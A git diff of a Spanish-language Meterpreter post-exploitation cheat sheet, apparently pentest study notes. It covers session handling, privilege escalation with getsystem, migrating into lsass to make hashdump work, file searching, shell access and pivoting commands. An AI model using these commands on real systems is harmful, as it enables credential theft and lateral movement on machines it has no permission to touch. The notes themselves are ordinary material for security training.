@@ -15,18 +15,30 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ background                 # Ponemos la sesion en segundo plano
 ❯ sessions                   # Miramos las sesiones activas 
 ❯ sessions -u <ID>           # Regresamos a la sesion 
+
 ❯ sysinfo                  # Muestra informacion del Windows 
-❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
-❯ pgrep lsass              # Mirar el numero del proceso y asi poder escalar privilegios 
-❯ migrate <ID>             # Nos migramos al proceso 
 ❯ getuid                   # Miramos el nombre del usuario 
-❯ getprivs                 # Miramos los privilegios 
+❯ getprivs                 # Miramos los  procesos con privilegios 
 ❯ getsystem                # Miras los procesos privilegiados 
-❯ getprivs                 # Miramos los  procesos con privilegios
-❯ hashdump                 # Te muestra todos los hashes de los usuarios 
+❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
+❯ search -f *.doc          # Buscar un archivo 
+
 ❯ shell                      # Nos carga una shell
 	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
 ❯ pwd                        # Nos muestra la ruta del dir actual 
 ❯ cd /                       # Nos dirigimos a la raiz 'C:\'
 ❯ cat file.txt               # Miramos el contenido de un archivo 
+
+❯ hashdump                 # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
+	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
+	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
+```
+
+## Para hacer Pivoting con Metasploit
+
+```bash 
+❯ arp                      #
+❯ netstat                  # 
+❯ route                    # 
+❯ portfwd                  # 
 ```
